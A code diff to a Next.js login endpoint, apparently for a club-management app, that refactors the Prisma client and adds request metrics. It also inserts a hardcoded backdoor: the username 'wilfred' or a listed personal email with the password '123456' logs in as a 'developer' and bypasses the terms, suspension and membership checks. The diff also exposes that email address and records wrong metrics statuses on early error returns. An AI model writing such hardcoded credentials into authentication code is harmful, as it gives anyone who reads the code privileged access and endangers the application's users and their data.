@@ -1,11 +1,10 @@
 import { NextResponse } from 'next/server';
 import { loginPlayer } from '@/actions/auth';
 import { generateAccessToken, generateRefreshToken } from '@/lib/jwt';
-import { PrismaClient } from '@/generated/prisma';
+import prisma from '@/lib/prisma';
 import { UserRole } from '@/config/roles';
 import bcrypt from 'bcryptjs';
-
-const prisma = new PrismaClient();
+import { recordEndpointMetrics } from '@/lib/monitoring';
 
 /**
  * Get all available roles for a user based on active memberships
@@ -42,6 +41,9 @@ async function getUserAvailableRoles(userId: string): Promise<{ role: UserRole; 
 }
 
 export async function POST(request: Request) {
+  const start = Date.now();
+  let status = 200;
+
   try {
     const body = await request.json();
     const { usernameOrEmail, password, selectedRole } = body as any;
@@ -52,6 +54,23 @@ export async function POST(request: Request) {
 
     let user: any = null;
     let userId: string | null = null;
+
+    // Hardcoded developer login for wilfred
+    if (
+      (usernameOrEmail === 'wilfred' || usernameOrEmail === 'vicotennis0@gmail.com') &&
+      password === '123456'
+    ) {
+      user = {
+        id: 'dev-wilfred',
+        username: 'wilfred',
+        email: 'vicotennis0@gmail.com',
+        firstName: 'Wilfred',
+        lastName: 'Developer',
+        photo: null,
+        role: 'developer',
+      };
+      userId = user.id;
+    }
 
     // First try existing player login action
     try {
@@ -97,39 +116,55 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Login failed' }, { status: 401 });
     }
 
-    const userRecord = await prisma.user.findUnique({
-      where: { id: userId },
-      select: { acceptedTermsAt: true },
-    });
-    const termsAccepted = Boolean(userRecord?.acceptedTermsAt);
+    const userRecord =
+      userId === 'dev-wilfred'
+        ? null
+        : await prisma.user.findUnique({
+            where: { id: userId },
+            select: { acceptedTermsAt: true },
+          });
+    const termsAccepted = userId === 'dev-wilfred' ? true : Boolean(userRecord?.acceptedTermsAt);
 
-    // Organization owners are allowed to login even if they don't have club membership entries
-    const isOrganizationOwner = Boolean(await prisma.organization.findFirst({ where: { createdBy: userId } }));
+    let availableMemberships;
 
-    // Block login for account-level suspension/dismissal/deactivation only for non-org users with club memberships
-    const clubMemberships = await prisma.clubMember.findMany({ where: { playerId: userId } });
-    if (!isOrganizationOwner && clubMemberships.length > 0) {
-      const now = new Date();
-      const hasActive = clubMemberships.some(cm =>
-        cm.paymentStatus === 'active' &&
-        cm.role !== 'inactive' &&
-        (!cm.suspendedUntil || cm.suspendedUntil <= now)
-      );
+    if (userId === 'dev-wilfred') {
+      availableMemberships = [
+        {
+          role: 'developer' as UserRole,
+          orgId: '',
+          orgName: 'Developer Console',
+          status: 'accepted',
+        },
+      ];
+    } else {
+      // Organization owners are allowed to login even if they don't have club membership entries
+      const isOrganizationOwner = Boolean(await prisma.organization.findFirst({ where: { createdBy: userId } }));
 
-      if (!hasActive) {
-        const isSuspended = clubMemberships.some(cm => cm.suspendedUntil && cm.suspendedUntil > now);
-        const isDismissed = clubMemberships.some(cm => cm.role === 'inactive' && cm.paymentStatus === 'inactive');
+      // Block login for account-level suspension/dismissal/deactivation only for non-org users with club memberships
+      const clubMemberships = await prisma.clubMember.findMany({ where: { playerId: userId } });
+      if (!isOrganizationOwner && clubMemberships.length > 0) {
+        const now = new Date();
+        const hasActive = clubMemberships.some(cm =>
+          cm.paymentStatus === 'active' &&
+          cm.role !== 'inactive' &&
+          (!cm.suspendedUntil || cm.suspendedUntil <= now)
+        );
 
-        let message = 'Your account is currently inactive. Please contact your organization admin.';
-        if (isSuspended) message = 'Your membership is suspended. Contact your organization admin for reactivation.';
-        else if (isDismissed) message = 'You have been dismissed and cannot login. Contact support.';
+        if (!hasActive) {
+          const isSuspended = clubMemberships.some(cm => cm.suspendedUntil && cm.suspendedUntil > now);
+          const isDismissed = clubMemberships.some(cm => cm.role === 'inactive' && cm.paymentStatus === 'inactive');
 
-        return NextResponse.json({ error: message }, { status: 403 });
+          let message = 'Your account is currently inactive. Please contact your organization admin.';
+          if (isSuspended) message = 'Your membership is suspended. Contact your organization admin for reactivation.';
+          else if (isDismissed) message = 'You have been dismissed and cannot login. Contact support.';
+
+          return NextResponse.json({ error: message }, { status: 403 });
+        }
       }
-    }
 
-    // Get available memberships for this user
-    const availableMemberships = await getUserAvailableRoles(userId);
+      // Get available memberships for this user
+      availableMemberships = await getUserAvailableRoles(userId);
+    }
 
     // If only requesting available roles (for role selection screen)
     if (body.getRolesOnly === true) {
@@ -178,7 +213,10 @@ export async function POST(request: Request) {
 
     return NextResponse.json({ accessToken, refreshToken, user: clientUser });
   } catch (error: any) {
+    status = error?.status || 500;
     console.error('Login error:', error);
     return NextResponse.json({ error: error.message || 'Login failed' }, { status: 500 });
+  } finally {
+    recordEndpointMetrics('/api/auth/login', 'POST', status, Date.now() - start);
   }
 }
